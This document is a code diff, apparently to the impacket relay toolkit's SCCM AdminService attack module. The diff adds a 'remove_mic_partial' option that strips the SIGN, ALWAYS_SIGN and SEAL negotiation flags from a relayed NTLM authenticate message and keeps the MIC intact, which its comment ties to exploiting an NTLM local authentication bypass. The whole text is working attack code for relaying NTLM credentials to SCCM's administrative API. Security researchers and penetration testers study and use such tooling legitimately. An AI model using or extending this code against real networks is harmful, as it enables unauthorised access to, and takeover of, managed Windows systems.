@@ -16,6 +16,7 @@
 from impacket import LOG
 from struct import unpack
 from impacket.spnego import SPNEGO_NegTokenResp
+from impacket.ntlm import NTLMAuthChallengeResponse, NTLMSSP_NEGOTIATE_SIGN, NTLMSSP_NEGOTIATE_ALWAYS_SIGN, NTLMSSP_NEGOTIATE_SEAL
 import json
 import base64
 
@@ -34,6 +35,25 @@ class ADMINSERVICEAttack:
             token = respToken2['ResponseToken']
         else:
             token = self.config.sccmAdminToken
+
+        # When exploiting NTLM local authentication bypass, remove SIGN/SEAL but keep MIC/Version intact
+        if self.config.remove_mic_partial:
+            LOG.debug('Applying remove_mic_partial processing to AdminService token')
+            authMessage = NTLMAuthChallengeResponse()
+            authMessage.fromString(token)
+            if authMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
+                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
+                LOG.debug('Removed NTLMSSP_NEGOTIATE_SIGN flag')
+            if authMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
+                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
+                LOG.debug('Removed NTLMSSP_NEGOTIATE_ALWAYS_SIGN flag')
+            if authMessage['flags'] & NTLMSSP_NEGOTIATE_SEAL == NTLMSSP_NEGOTIATE_SEAL:
+                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SEAL
+                LOG.debug('Removed NTLMSSP_NEGOTIATE_SEAL flag')
+            # Do NOT remove KEY_EXCH or VERSION flags
+            # Do NOT zero out MIC or Version fields - keep NTLM3 message intact
+            token = authMessage.getData()
+
         auth = base64.b64encode(token).decode("ascii")
         headers = {'Authorization':'%s %s' % ('Negotiate', auth),'Content-Type': 'application/json; odata=verbose'}
 
